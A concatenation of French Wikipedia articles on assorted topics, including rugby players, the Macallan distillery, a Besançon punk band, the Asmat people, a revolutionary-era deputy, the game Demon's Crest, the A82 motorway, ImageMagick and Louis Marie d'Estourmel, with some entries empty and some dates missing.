Les violences contre la population et les forces de l'État continuent de manière sporadique. Nombreuses manifestations et répressions des forces de l'ordre, marasme économique et élections encore largement contrôlées par l'armée.
La fin de la « décennie noire ».
La fin de la « décennie noire » est appréciée différemment selon les auteurs suivants : pour Benjamin Stora, elle se termine en 2001 ; pour Sid Ahmed Ghozali ainsi que pour Pierre-Jean Roca, elle prend fin en 2002 ; pour Fanny Colonna, elle ne s'arrête qu'en 2003 ; voire, pour Pierre Daum, en 2005.
Groupe armés de la guerre civile algérienne.
La plupart s'opposant au gouvernement :
Mais certains le supportant :

</doc>
<doc id="568339" url="https://fr.wikipedia.org/wiki?curid=568339" title="Mathieu Dourthe">
Mathieu Dourthe

Mathieu Dourthe, né le à Dax, est un joueur français de rugby à XV évoluant au poste d'ailier, arrière ou demi d'ouverture.
Biographie.
Il est sélectionné en équipe de France une fois le , contre les "All Blacks".
Anecdotes.
Il n'a aucun lien de parenté avec Richard Dourthe et Claude Dourthe, tous deux également joueurs dacquois.

</doc>
<doc id="568340" url="https://fr.wikipedia.org/wiki?curid=568340" title="Macallan">
Macallan

Macallan est une distillerie de whisky située à Craigellachie dans la région du Speyside en Écosse. Créée en 1824 par Alexander Reid, la distillerie appartient au groupe Edrington.
Macallan est une des distilleries les plus importantes du Speyside, tant en production qu’en renommée de ses whiskies.
Historique.
La distillerie Macallan est construite en 1824 par un nommé Alexander Reid.
Des travaux débutent en pour édifier une nouvelle distillerie prévue pour 2014, pour un investissement de de livres sterling (environ d’euros). L'ancienne distillerie sera mise en sommeil, et ses équipements transférés dans la nouvelle. Dotée de nouveaux alambics Forsyth &amp; Sons, en plus des actuels qui y seront donc transférés, la nouvelle distillerie disposera d’une capacité de production de quinze millions de litres d’alcool pur par an, contre neuf pour l'actuelle, ce qui en fera la plus grande distillerie de malt d’Écosse.
Fabrication.
La distillerie possède sept "wash stills" et quatorze "spirit stills" de très petite taille et produit près de six millions de litres d’alcool pur par an. Le vieillissement des whiskies se fait dans deux types de fûts. Une première série de fûts en provenance d'Espagne est utilisée. Ce sont des fûts fabriqués à la tonnellerie de Jerez de la Frontera à partir d'un bois riche en tannin. Ces fûts sont utilisés deux saisons pour la fabrication du sherry puis sont vidés et envoyés à la distillerie Macallan. La deuxième série de fûts est d'origine américaine. Ces fûts sont fabriqués dans une tonnellerie du Kentucky. Ils sont utilisés pour la maturation du bourbon pendant huit années. Ils sont ensuite vidés et envoyés à la distillerie Macallan.
Les versions du Macallan sont des assemblages des différentes maturations entre fûts espagnols et fûts américains. Ces "single malts" sont riches et puissants et marqués par des arômes de fruits secs et d’épices.
Production.
Il existe une très grande variété de versions du Macallan.
La production traditionnelle de Macallan :
Macallan a lancé récemment une nouvelle série de whiskies nommée "Fine Oak series", dont la particularité tient en l'utilisation de fûts de chêne européen:
Il existe également une gamme millésimée entre 1926 et 1976 : la "Fine &amp; Rare Collection".
La série 1824 de la distillerie regroupe 4 single malts sous les appellations Gold, Amber, Sienna et Ruby sans mention d’âge, mettant la sélection des fûts en avant.
Le Macallan est aussi utilisé comme base de blends pour The Famous Grouse notamment.
Ventes.
Avec neuf millions de litres d’alcool pur produits par an, Macallan est en 2014 la quatrième distillerie de malt d’Écosse, derrière Roseisle (Diageo), Glenfiddich (William Grant &amp; Sons) et The Glenlivet (Pernod Ricard), et le troisième single malt le plus vendu au monde, la distillerie de Roseisle étant destinée à alimenter les blends de Diageo.
En , une bouteille de Macallan 1926 a été vendue aux enchères chez Christie's dollars. Cela en faisait à l'époque la bouteille d'alcool la plus chère jamais vendue. Le , une bouteille de six litres d'un Macallan "Imperiale M Decanters" a été vendue aux enchères à Hong-Kong, devenant la bouteille de whisky la plus chère de l'histoire.
A l'été 2017, l'Hôtel Waldhaus à Saint-Moritz (Suisse), détenteur de la plus grande collection de whiskys au monde, a ouvert une bouteille de 1878, dernière existante au monde, afin de combler le désir d'un amateur chinois, qui aurait déboursé 9999 CHF pour 2cl de ce précieux breuvage. Après expertise, la bouteille est en réalité une falsification, le whisky datant entre 1970 et 1972.
Un nouveau record est battu en novembre 2023, avec une vente aux enchères pour 2,188 millions de livres sterling. Ce whisky écossais distillé en 1926 a été mis en bouteille avec une étiquette dessinée en 1993 par le peintre italien Valerio Adami.
Références dans la culture populaire.
Dans l'épisode 6 de la troisième saison de "Better Call Saul", Howard vient rendre visite à Chuck avec une bouteille de Macallan de 35 ans d'âge.
James Bond dans "Skyfall" incarné par Daniel Craig est aussi un amateur de Macallan, c'est même son whisky préféré. Dans une scène sur l'île de Hashima , Tiago Rodriguez, alias « Raoul Silva » (interprété par Javier Bardem) propose à James Bond un Macallan 50 ans d'âge. 
C'est également le spiritueux préféré d'Harvey Specter dans la série "" : on peut le voir régulièrement revenir chez lui, une bouteille de Macallan à la main.

</doc>
<doc id="568346" url="https://fr.wikipedia.org/wiki?curid=568346" title="David Laperne">
David Laperne

David Laperne, né le à Oloron-Sainte-Marie (Pyrénées-Atlantiques), est un joueur international français de rugby à XV évoluant au poste de pilier. Formé au FC Oloron, il remporte le Challenge européen en 2000 avec la Section paloise.
Il est le père de Paul Laperne, talonneur évoluant à l'US Dax.
Biographie.
Jeunesse et formation.
David Laperne commence sa carrière rugbystique dès son enfance, à l'âge de 8 ans, au sein du club de l'AS Asasp-Arros, situé en vallée d'Aspe, dans les Pyrénées-Atlantiques. Il rejoint ensuite le FC Oloron en junior, où il évolue jusqu'à ses 20 ans, remportant la Coupe Reichel.
Révélation à Dax.
En 1992, David Laperne signe avec l'US Dax, qui évolue alors en Groupe A. Il évolue d'abors avec les juniors, et remporte de nouveau la Coupe Reichel.
Laperne s'impoe peu à peu en équipe première aux côtés de Fabien Pelous, Olivier Magne, Richard Dourthe et Raphaël Ibañez.
David Laperne participe à deux demi-finales du championnat de France en 1994 et 1996, sans pour autant décrocher un titre. Il se forge une réputation au poste de pilier, ce qui lui vaut d'être recruté par le CA Brive à l'été 1997, aux côtés d'autres figures landaises comme Olivier Magne et Olivier Gouaillard, originaire lui aussi d'Oloron.
Une saison à Brive.
Le CA Brive, alors champion d'Europe en titre, compte sur Laperne pour renforcer son pack. Il participe notamment à la finale de la Coupe d'Europe 1998 face à Bath Rugby, où il entre en jeu à la 51e minute. Malgré une prestation solide, Brive s'incline de justesse 19-18, échouant dans sa quête du doublé.
Retour en Béarn.
En 1998, Laperne retourne dans son Béarn natal en rejoignant la Section paloise en compagnie de Laurent Arbo. C'est avec la Section qu'il connaît ses plus grands succès, notamment la victoire en Challenge européen en 2000. Il évolue au sein de la Section paloise pendant 8 saisons de rang, jusqu'en 2006, mettant à profit son expérience pour encadrer l'éclosion de jeunes joueurs tels que Imanol Harinordoquy, Damien Traille, Lionel Beauxis ou Fabien Cibray.
A la fin de son aventure paloise, Laperne rejoint le Tarbes PR en 2006-2007, avant de signer pour une dernière aventure au FC Oloron où il termine sa carrière de joueur en 2014.
Carrière internationale.
David Laperne obtient une seule cape en équipe de France de rugby à XV, lors d'un test match contre l'équipe de Roumanie le .
David Laperne a également évolué avec les Barbarians. Le , il a participé à un match contre les Leicester Tigers au Welford Road Stadium. Les Barbarians l'ont emporté 51-25. Laperne a joué au poste de pilier lors de ce match, sa seule apparition sous le maillot des Barbarians.
Après-carrière.
Après sa carrière de joueur, David Laperne s'investit dans le coaching. Il devient entraîneur des avants du FC Oloron en binôme avec Jean-Paul Trille, jusqu'en 2015. En 2018, il rejoint également l'AS Pont-Long en tant qu'entraîneur, aux côtés de Bertrand Saux jusqu'en 2022.
Parallèlement à ses activités rugbystiques, il mène une carrière dans la fonction publique en tant que policier municipal à Oloron-Sainte-Marie.
Statistiques en équipe nationale.
David Laperne compte une seule cape en équipe de France et n'a pas marqué de points.
Palmarès.
Avec la Section paloise : 

</doc>
<doc id="568347" url="https://fr.wikipedia.org/wiki?curid=568347" title="Second Rate">
Second Rate

Second Rate est un groupe de punk rock mélodique français, originaire de Besançon, dans le Doubs. Le groupe est formé en 1998 sur les cendres de deux autres groupes, Gimp et Unduly. Second Rate se sépare en octobre 2003, laissant à la place à Lost Cowboy Heroes, Hawaii Samurai et à Generic. 
Dans un second temps, l'ancien guitariste Nasty Samy (Samuel Guillerand) apparaîtra au sein de The Black Zombie Procession, Teenage Renegade, Demon Vendetta ou encore Hellbats, The Last Brigade, Sparkling Bombs. Sylvain Bombled (chant, batterie) de son côté participera à des groupes parfois éloignés de la scène emo-punk (Generic, Napoleon Solo, Robespierre, Mayerling), en bénéficiant en 2013 du statut d'artiste-associé à la salle de concert bisontine de la Rodia.
Biographie.
Le groupe est formé à Besançon, dans le Doubs, en 1998 des cendres de deux autres formations à tendance punk rock mélodique. Second Rate enchaîne rapidement enregistrements (démos, compilations, splits 45 tours), concerts et apparitions médiatiques (fanzines, magazines, webzines et radios). Précédé d'un buzz important malgré sa courte existence, le groupe sort son premier CD dix titres "NiceLineLife" en mars 2000 chez Prehisto Records et Vampire Records, le label créé par Nasty Samy, et s'impose comme un espoir sérieux d'une scène française emo-punk qu'ils partagent avec leurs amis de Dead Pop Club, Flying Donuts, Sexypop, et Homeboys.
Le premier album studio du groupe, "Grinding to Dust Two Years Somewhat Insane", enregistré au Studio Pôle Nord avec Fred Gramage, est publié l'année suivante, et obtient de nombreuses critiques positives de la part des médias et du public. Suivront de nombreuses apparitions sur des splits, compilations samplers et albums hommages.
Au cours de sa carrière, Second Rate donne plus de 250 concerts aux quatre coins de la France, mais aussi à l'international comme en Angleterre, en Écosse, et en Suisse. Ils partagent la scène avec des groupes tels que Propagandhi (Canada), Horace Pinker (É.-U), Garrison (É.-U), Peter and the Test Tube Babies (R.-U), Fifi and the Mach III (Japon), Vision (É.-U), Capitol City Dusters (É.-U), Aina (Espagne), Christian Death (R.-U), John and the Night Raiders (É.-U), Scuttle (R.-U), Burning Heads, Uncommonmenfrommars, Seven Hate, Eiffel, Virago, X-Syndicate, Les Thugs, Greedy Guts, Bushmen, Portobello Bones ; ainsi que de nombreuses dates et tournées avec Dead Pop Club, Homeboys, Flying Donuts, et Sexypop ; sans compter un passage remarqué au Printemps de Bourges 2002 et une sélection aux Eurockéennes de Belfort pour l'édition 2003. 
Le groupe annonce sa séparation au cours de l'année 2003, essentiellement car le rythme des tournées est incompatible avec la vie personnelle et familiale de Sylvain Bombled qui désirait reprendre ses études. Peu de temps après sort l'album posthume "Last Days of Glory". À la fin 2013, l'ancien guitariste Nasty Samy confirme la réunion de Second Rate en 2014 pour quelques dates, en support de la réédition de certains de leurs albums en version vinyle.
Influences.
Les membres de Second Rate revendiquent l'influence de labels comme Revelation Records, Taang! Records, Sub Pop, Spliff Records, Boss Tuneage, et Citadel Records, et des scènes anglaises et américaines de la fin des années 1980 et du début des années 1990 (avec des groupes comme Samiam, Hüsker Dü/Sugar, Mega City Four, Jawbreaker, Pixies, Moving Targets, Fugazi, Doughboys, Senseless Things, Dinosaur Jr, Lemonheads...) et par la suite de la nouvelle vague punk-rock mélodique américaine (Hot Water Music, Texas Is the Reason, Knapsack, Alkaline Trio...), partageant l'état d'esprit des piliers de la scène indépendante française des années 1980 et 1990 (Les Thugs, Real Cool Killers, Burning Heads, Drive Blind, Sixpack...) et mélangeant habilement l'énergie punk rock, les mélodies pop et l'attitude rock 'n' roll, ils se définissaient simplement comme un groupe de rock, avec de grosses guitares en avant mais n'oubliant pas les belles mélodies, animé d'une seule volonté : faire de bonnes chansons.

</doc>
<doc id="568349" url="https://fr.wikipedia.org/wiki?curid=568349" title="Grémil rouge-bleu">
Grémil rouge-bleu



</doc>
<doc id="568351" url="https://fr.wikipedia.org/wiki?curid=568351" title="Jean Baptiste Le Moyne de Bienville">
Jean Baptiste Le Moyne de Bienville



</doc>
<doc id="568353" url="https://fr.wikipedia.org/wiki?curid=568353" title="Lithospermum purpurocaeruleum">
Lithospermum purpurocaeruleum



</doc>
<doc id="568357" url="https://fr.wikipedia.org/wiki?curid=568357" title="Asmat">
Asmat

Les Asmat sont un groupe ethnique de la province indonésienne de Papouasie. Ils vivent principalement dans le kabupaten d'Asmat, dans les forêts marécageuses de la côte sud.
Ils sont environ et se nourrissent de poisson, de gibier et cuisinent la farine du palmier sagoutier. Les langues qu'ils parlent forment le groupe des langues asmat.
Art asmat.
Il est probable que c'est durant ses recherches pour acquérir des objets asmat, que Michael C. Rockefeller fut tué. Il s'agit seulement d'une hypothèse, contredisant celle selon laquelle il se noya dans le Pacifique en tentant de rejoindre à la nage le rivage de la Nouvelle Guinée après le naufrage de sa pirogue. Selon sa sœur jumelle Mary, "personne ne sait ce qui est arrivé" (à son frère).
Depuis 1973, les Asmat ont un musée qui leur est consacré dans la ville d'Agats : l', ouvert sous l'égide d'une mission catholique et avec l'aide scientifique d'Ursula et Gunter Konrad, médecins de formation.

</doc>
<doc id="568358" url="https://fr.wikipedia.org/wiki?curid=568358" title="Jacques Louis Dupont">
Jacques Louis Dupont

Jacques Louis Dupont, dit « Jacob Louis Dupont des Jumeaux », est un curé rouge et religieux français devenu homme politique, né le à Loches (Touraine) et mort le à l'hôpital de Charenton dans la commune de Saint-Maurice (Val-de-Marne). Il a exercé des fonctions pendant la Révolution française, mais son parcours est atypique.
Biographie.
Sous l'Ancien Régime, il a à maintes reprises changé de résidence.
Il entre au séminaire de Tours. En 1781, on le retrouve comme prieur commendataire de Sainte-Marie d'Eymet, dans le Périgord. Par la suite, il entre dans la Congrégation des Frères de la doctrine chrétienne, il devient enseignant au collège de Chaumont-en-Bassigny dans la Haute-Marne.
En 1780, on le trouve à Bordeaux muni de l'approbation de d'Alembert, de Lalande et de Vergennes. Il s'était proposé aux jurats, mais après leur refus, il s'est tourné vers l'intendant de la généralité de Bordeaux Nicolas Dupré de Saint-Maur qui l'a accueilli. Il a ouvert le un cours public et gratuit de mathématiques et d'architecture navale dans la salle des concerts de l'hôtel de l'Intendance. Il est correspondant de l'Académie des sciences de Paris. Il a fondé en mars 1783 la société "Le Musée" de Bordeaux à l'imitation de celle de Paris. Il a été le fondateur avec L. G. de Clozanges (1747-1785) et H.E. Gaufreteau de la Gorce (1744-1820) du "Journal de Guienne", première gazette quotidienne fondée à Bordeaux. Il a quitté Bordeaux vers 1786 après le départ de l'intendant Dupré de Saint-Maur.
À la veille de la Révolution, on ignore la raison, mais il se trouve dans son pays natal, à Perrusson.
Mandat à la Législative.
La France devient une monarchie constitutionnelle en application de la constitution du 3 septembre 1791. 
Le même mois, Jacques-Louis Dupont, alors maire de Perusson, est élu député suppléant du département d'Indre-et-Loire, le premier sur trois, à l'Assemblée nationale législative. Il est appelé à siéger dès le début de la session parlementaire à la faveur de la démission d'Hardouin. 
Il siège sur les bancs de la gauche de l'Assemblée. En avril 1792, il vote pour que les soldats du régiment de Châteauvieux, qui s'étaient mutinés lors de l'affaire de Nancy, soient admis aux honneurs de la séance. En août, il vote en faveur de la mise en accusation du marquis de La Fayette. 
Mandat à la Convention.
La monarchie prend fin à l'issue de la journée du 10 août 1792 : les bataillons de fédérés bretons et marseillais et les insurgés des faubourgs de Paris prennent le palais des Tuileries. Louis XVI est suspendu et incarcéré, avec sa famille, à la tour du Temple. 
En septembre 1792, Jacques-Louis Dupont est réélu député d'Indre-et-Loire, le deuxième sur huit, à la Convention nationale. En octobre, il est élu membre suppléant du Comité d'instruction publique. Le 15 décembre, il prononce un discours dans lequel il s'oppose au projet d'instruction de Pierre-Toussaint Durand de Maillane (député des Bouches-du-Rhône) et dans lequel il affirme ses convictions athées : Je l'avouerai de bonne foi à la Convention, je suis athée. Il siège sur les bancs de la Montagne. Lors du procès de Louis XVI, il vote la mort, rejette l'appel au peuple mais est absent au dernier appel nominal relatif au sursis à l'exécution de la peine. En avril 1793, il est absent lors du scrutin sur la mise en accusation de Jean-Paul Marat. En mai, il vote contre le rétablissement de la Commission des Douze. 
Jacob Dupont présente sa démission pour des motifs de santé en prairial an II (juin 1794). Il est remplacé par Louis Champigny-Aubin en vendémiaire an III (septembre 1794). 
En nivôse an V (décembre ou ), il est surpris en train de violer une vieille femme atteinte de cécité. Il est arrêté et emprisonné. Le tribunal criminel de Seine-et-Oise le condamne à l'internement. Il est confié à sa famille qui en prend la responsabilité. Mais sa maladie s'aggrave, ses excentricités sont de plus en plus fréquentes, on finit par l'interner à Charenton où il meurt le .

</doc>
<doc id="568359" url="https://fr.wikipedia.org/wiki?curid=568359" title="Grémil pourpre-bleu">
Grémil pourpre-bleu



</doc>
<doc id="568364" url="https://fr.wikipedia.org/wiki?curid=568364" title="Grémil">
Grémil



</doc>
<doc id="568365" url="https://fr.wikipedia.org/wiki?curid=568365" title="Demon's Crest">
Demon's Crest

, ou au Japon, est un jeu vidéo de plates-formes développé par Capcom, sorti sur Super Nintendo en 1994. C'est la suite de "" sur Nintendo Entertainment System.
"Demon's Blazon" est publié au Japon le , les versions occidentales de "Demon's Crest" sont publiées en Amérique du Nord en puis en Europe en .
La jaquette européenne et américaine, représentant Firebrand, a été réalisée par l'artiste Julie Bell.
Trame.
Histoire.
"" met en scène , connu dans le Royaume des Démons comme le descendant de la Gargouille Légendaire.
Alors qu'une guerre civile fait rage dans le Royaume des Démons, 6 pierres magiques tombèrent du ciel. Chacune d'elles donne à son possesseur des pouvoirs magiques, mais il est dit que la Pierre de L'Éternité apparaîtra à celui qui réunira toutes les pierres magiques. Rapidement, les démons se disputent ces pierres, mais Firebrand parvient à en récupérer 5.
Après un long combat contre le dragon Somulo, Firebrand obtient la dernière pierre, mais sa victoire l'a laissé gravement blessé. C'est à ce moment que surgit Phalanx, ancien soldat des Destructeurs, qui lui vole toutes les pierres.
Laissé en pâture à Somulo, Firebrand devra sortir de sa prison, retrouver les pierres qui lui ont été volées, et se venger de Phalanx.
Personnages.
C'est le dernier boss du jeu, et possède trois formes différentes.
Dans le jeu, il faudra le battre à trois reprises. Une pierre magique récompense chacune de vos victoires contre lui.
Somulo est le tout premier boss du jeu, intervenant dès le commencement de la partie. Le vaincre relève de la formalité.
Système de jeu.
"Demon's Crest" est un jeu de plateforme avec des éléments de RPG comme le menu, la magie ou encore la carte du monde. Le menu récapitule la liste des objets, l'or obtenu ainsi que les armes et les pierres du personnage pour les transformations. Le système de sauvegarde de "Demon's Crest" passe par l'utilisation de mot de passe de 16 lettres via un tableau de 4 lignes et 4 colonnes.
Les contrôles du jeu sont basiques, le bouton codice_1 sert pour les attaques, le bouton codice_2 pour le saut et le bouton codice_3 pour utiliser la magie. Le bouton codice_4 lui permet de briser des statues. Le joueur incarne Firebrand, dont l'objectif est de récupérer les 6 pierres élémentaires : feu, terre, air, eau, temps et ciel. Ces pierres octroient à Firebrand de nouveaux pouvoirs, ils sont reconnaissables par la couleur et un design légèrement différent pour chaque pierre.
La pierre de l'eau change Firebrand en gargouille aquatique, cela lui permet de respirer sous l'eau et de nager dans certains passages. La pierre de la terre () transforme Firebrand en gargouille de terre, cette pierre lui donne la possibilité de foncer dans certains murs pour les détruire, mais il perd ses ailes en contrepartie. La pierre de l'air, permet à Fireband de voler librement dans les airs. La pierre du temps transforme Firebrand en gargouille légendaire, sa résistance et la puissance de ses boules de feu sont doublées.
La pierre du feu est divisée en cinq fragments, Firebrand possède la première et doit retrouver les quatre autres. Ces fragments qui s'obtiennent au cours de la partie, sont utiles pour briser des murs (), créer des plate-formes (), escalader les murs () et infliger de gros dégâts (). Le jeu intègre diverses boutiques, la boutique vend plusieurs types de potions pour récupérer des points de vie, la boutique vend des parchemins qui servent à utiliser des sorts magiques. Un démon appelé explique au joueur ce que fait chaque talisman.
Cinq variétés de talismans sont proposées : le talisman accroît les chances de trouver des pièces dorées, le talisman accélère la cadence de tir, le talisman accroît les chances de trouver de l'énergie, le talisman améliore la résistance du personnage et le talisman améliore la puissance des tirs.
Déroulement du jeu.
Quête principale.
Le jeu démarre directement par l'affrontement contre le gigantesque dragon. Une fois le boss vaincu, Firebrand traverse plusieurs niveaux d'action. Le héros rejoint chaque niveau en volant au-dessus du monde des Démons. 4 niveaux sont disponibles au départ, et il faudra trouver des passages secrets ou battre certains ennemis pour débloquer les 3 derniers niveaux. Chaque niveau se termine par un combat contre un boss.
Le jeu totalise sept niveaux, ils sont affichés via une carte et sympbolisés par des chiffres romains (I, II). "Demon's Crest" se sert du Mode 7 pour afficher la carte du monde et l'utiliser pour les déplacements entre les niveaux. Le premier niveau, le Colisée, se subdivise en 3 tableaux et contient 3 boss : Somulo en tout début de partie, puis un hippogriffe, et enfin le premier duel contre le général Arma, où la victoire rapportera la Pierre de la Terre.
Le niveau s'achève par le duel contre Phalanx. Si le joueur a récupéré 100 % des objets cachés dans le jeu (joyaux et talismans), il affrontera la forme ultime de Phalanx.
Les différentes fins du jeu.
La fin du jeu diffère selon le nombre de pierres et d'objets récupérés. La mauvaise fin est accessible après avoir traversé les 4 niveaux de départ, ce qui a fait dire que le jeu était trop court. Mais il faut bien avoir parcouru tous les niveaux et obtenus tous les objets du jeu pour avoir la meilleure fin du jeu.
Firebrand prend par surprise son ennemi Phalanx, qui n'a pas le temps d'invoquer les pouvoirs de la Pierre du Ciel. Après un rapide combat, le démon rouge détruit Phalanx. Sa vengeance accomplie, il part soigner ses blessures. Le Royaume des Démons sombre dans le chaos, mais le bras droit de Phalanx, Arma, songe à prendre le pouvoir.
Firebrand retrouve Phalanx, mais la puissance de son ennemi est désormais considérable. Après un premier affrontement, Phalanx invoque les pouvoirs de la Pierre du Ciel pour se changer en dragon. Après un combat très difficile, Firebrand anéantit Phalanx et s'empare de la Pierre du Ciel. Sa vengeance est accomplie, maintenant le Démon Rouge a acquis une puissance supérieure à celle de la Gargouille Légendaire, mais il n'utilisera pas ce pouvoir pour régner sur le Monde des Démons. Il lui reste un défi : la Pierre de l'Éternité apparaîtra quand un seul être sera en possession des 6 pierres. Cette pierre devra être sienne !

</doc>
<doc id="568374" url="https://fr.wikipedia.org/wiki?curid=568374" title="Autoroute A82 (France)">
Autoroute A82 (France)

L'autoroute A82 est une courte autoroute française située entre Orvault et Sautron au nord-ouest de Nantes, dans le département français de la Loire-Atlantique. Il était prévu qu'elle relie, à terme Brest à Nantes, couvrant ainsi tout le sud de la région Bretagne.
Tracé.
Son tracé n'est constituée que d'un court segment, situé entre le périphérique de Nantes et le début de la RN 165.
La vitesse est limitée à et la circulation est gratuite.
Abandon du projet Nantes-Brest.
Dans les années 1990, il était prévu de mettre l'intégralité de la RN 165 aux normes autoroutières jusqu'à Brest. Une fois ces travaux terminés, la RN 165 devenait partie intégrante de l'A82. Pour cela, les bandes d'arrêt d'urgence auraient été élargies ou créées, certains virages corrigés (virages de Daoulas, en particulier), certaines sorties remodelées (bandes d'accélération et de décélération trop courtes). De même, la voie express aurait adopté une signalisation conforme aux normes autoroutières (sorties numérotées, panneaux bleus, cartouches "A82" et panneaux "entrée/sortie d'autoroute" sur les échangeurs…). Des aires auraient aussi été créées.
Fin 2014, le projet est abandonné. La préfecture de la région Bretagne déclare, en , que . En , la Direction régionale des routes de l'Ouest enterre définitivement le projet : .
Échangeurs.
Section concédée à DIR Ouest et gratuite

</doc>
<doc id="568375" url="https://fr.wikipedia.org/wiki?curid=568375" title="A82">
A82

A82 est un sigle qui peut faire référence à plusieurs choses.

</doc>
<doc id="568376" url="https://fr.wikipedia.org/wiki?curid=568376" title="ImageMagick">
ImageMagick

ImageMagick est un logiciel libre, comprenant une bibliothèque, ainsi qu'un ensemble d'utilitaires en ligne de commande, permettant de créer, de convertir, de modifier et d'afficher des images dans un très grand nombre de formats. Les images peuvent être découpées, les couleurs peuvent être modifiées, différents effets peuvent être appliqués aux images, les images peuvent subir des rotations, il est possible d'y inclure du texte, des segments, des polygones, des ellipses et des courbes de Bézier, etc.
ImageMagick est un logiciel libre : sa licence est compatible avec la licence GNU GPL. Il est disponible sur la plupart des plates-formes. "ImageMagick" est une marque déposée.
La plupart des fonctionnalités d'ImageMagick peuvent être utilisées en ligne de commande, mais souvent, toutefois, ImageMagick est combiné avec d'autres programmes écrits dans des langages comme Perl, C, C++, Python, Ruby, PHP, OCaml ou Java, pour lesquels des interfaces prêtes à l'emploi (PerlMagick, Magick++, PythonMagick, RMagick, MagickWand pour PHP et JMagick) sont disponibles. Cela permet de manipuler des images de façon plus automatisée. 
ImageMagick utilise les nombres magiques pour identifier les différents formats d'image qu'il manipule.
Avantages.
Traitement en lot des fichiers images. Par exemple : redimensionner tous les fichiers images inclus dans un répertoire.

</doc>
<doc id="568377" url="https://fr.wikipedia.org/wiki?curid=568377" title="Robert C. Cooper">
Robert C. Cooper

Robert C. Cooper est un des auteurs de la série télévisée américaine "Stargate SG-1". Il était coproducteur avant la saison 7. Il a remplacé Brad Wright en tant que "show runner" à partir de la saison 8. 
Robert C. Cooper travaille très souvent en collaboration avec Joseph Mallozzi, Paul Mullie, Andy Mikita et Carl Binder.
Filmographie.
Depuis le 22-octobre-2016 : "Dirk Gently, détective holistique" (série télévisée)

</doc>
<doc id="568378" url="https://fr.wikipedia.org/wiki?curid=568378" title="Guy Accoceberry">
Guy Accoceberry

Guy Accoceberry ("Acco"), né le à Vittel, est un joueur international français de rugby à XV évoluant au poste de demi de mêlée.
En club, il porte les maillots de l'US Tyrosse et du CA Bordeaux Bègles.
Guy Accoceberry a inscrit à son palmarès un Grand Chelem en 1997, une troisième place à la Coupe du monde de rugby à XV 1995. Il a disputé 19 matchs en équipe de France de 1994 à 1997.
Biographie.
Carrière de joueur.
Guy Accoceberry commence sa carrière à l'US Tyrosse où il joue sept ans en première division entre 1987 et 1993 avant de rejoindre le Club athlétique Bordeaux Bègles Gironde, il y occupe le poste de demi de mêlée. 
Il est alors sélectionné à 19 reprises en équipe de France, de 1994 à 1997, alors qu'il est concurrencé notamment par Fabien Galthié et Philippe Carbonneau. 
Guy Accoceberry reçoit sa première cape à l'âge de 27 ans le . Il est retenu pour affronter les Néo-Zélandais à Christchurch, la France s'impose 23-20. Il dispute également le match suivant, il est alors le dernier passeur pour Jean-Luc Sadourny sur l'essai de la victoire resté dans les mémoires. La France vient de remporter les deux test matchs disputés en Nouvelle-Zélande.
Guy Accoceberry dispute le Tournoi des Cinq Nations 1995 comme titulaire, il dispute les quatre rencontres. Il joue deux parties comme titulaire lors des matchs de poule de la Coupe du monde de rugby à XV 1995 avant de se blesser (fracture du cubitus gauche). 
En 1995, il gagne la coupe Latine et en 1997, il remporte le Grand Chelem.
Il termine sa carrière sportive en 1999, à l'âge de 32 ans.
Reconversion, autres activités.
Guy Accoceberry est pharmacien, il tient une officine, associé avec son épouse Stéphanie. Il est également conseiller municipal de Bordeaux de 2008 à 2020, chargé du sport de haut niveau auprès d'Arielle Piazza, adjointe au maire chargée du sport, de la jeunesse et de la vie étudiante et consultant sur ARL, France Bleu Gironde et Franceinfo.
Palmarès.
Guy Accoceberry participe à une Coupe du monde, avec une place de troisième en 1995. Il remporte également un Tournoi des Cinq Nations en 1997, en réussissant à réaliser le Grand Chelem.

</doc>
<doc id="568380" url="https://fr.wikipedia.org/wiki?curid=568380" title="Louis Marie d'Estourmel">
Louis Marie d'Estourmel

Louis Marie, marquis d'Estourmel, né le à Suzanne (Somme) et mort le à Paris, est un général et homme politique français.
Biographie.
Il est le fils de François Louis d'Estourmel, major du régiment de Toulouse cavalerie, chevalier de Saint-Louis, grand bailli d'épée de Cambrésis en 1750, et de Louise Françoise Geneviève Le Veneur, sa première épouse.
Il est aussi le neveu de Constantin Louis d'Estourmel, le beau-frère de Charles de Lavaulx de Sommerécourt, le cousin-germain de François Marie Le Danois, marquis de Cernay.
Un officier des armées du Roi.
Il commence sa carrière militaire en 1760, comme mousquetaire de la première compagnie. Devenu en 1763 cornette des chevau-légers d'Orléans, il est promu en 1771 Mestre de camp, puis sous-lieutenant des gendarmes écossais. En 1776, il devient mestre de camp en second du régiment dragons-Conti. En 1780, il devient officier général en étant promu brigadier des armées du roi, en 1782 colonel du régiment de Pologne-cavalerie, puis maréchal de camp le . 
Des responsabilités politiques.
Admis aux honneurs de la cour en 1773, il est de 1774 à 1778 député des États du Cambrésis, puis en 1778-1779 député des États d'Artois à la cour de France.
C'est dans le Cambrésis que se trouve la paroisse d'Estourmel, dont il porte le nom.
Il est membre de l'assemblée des notables en 1787 et le Roi le nomme en 1788 grand-bailli d'épée de la noblesse du Cambrésis.
Le 8 avril 1789, il est élu député de la noblesse du Cambrésis aux États généraux. Son mandat lui impose le vote par ordre. Le 27 juin 1789, il rejoint la salle commune après l'ordre donné par Louis XVI. Le 2 juillet, il s'exprime en faveur du vote par ordre, mais le 14 juillet, ses commettants l'autorisent à accepter le vote par tête.
Pendant la Révolution.
Il s'exprime souvent à l'assemblée, en particulier pour défendre sa province, le Cambrésis et ses particularismes, en tant que région frontalière, annexée à la France seulement en 1677.
Le 4 août 1789, il se prononce en faveur de l'abolition des privilèges féodaux, mais les États dont il était le mandant le désavouent et lui retirent leur mandat. 
Il se prononce pour la religion catholique comme religion d'État, proteste contre la suppression des ordres religieux.
Il défend certains pouvoirs du Roi, tels celui de déclarer la guerre, de porter ses armoiries, d'organiser l'armée. 
il se prononce en faveur de la libéralisation de la culture du tabac, contre les assignats et contre le rattachement d'Avignon à la France.
Après la fuite de Varennes, il prête, le 22 juin 1791, le serment des militaires. En septembre 1791, il figure sur une liste de droite.
Après la séparation de l'Assemblée constituante en octobre 1791, il est nommé inspecteur général des armées et promu lieutenant-général le .
Il est accusé par Adam Philippe de Custine d'avoir mal interprété ses ordres et d'avoir retiré ses troupes des revers des Vosges, empêchant la réussite d'une opération. Il est emprisonné pendant quelques semaines. 
Le 26 mai 1793, la Convention nationale décrète qu'il n'y a pas lieu de l'inculper car il a pu prouver qu'il ne faisait qu'obéir aux ordres du général Pully. 
En juillet 1793, il est mis d'office à la retraite, en tant que noble. 
Il est emprisonné à Amiens pendant la Terreur, à partir de septembre 1793, et élargi le 11 pluviôse an III (30 janvier 1795).
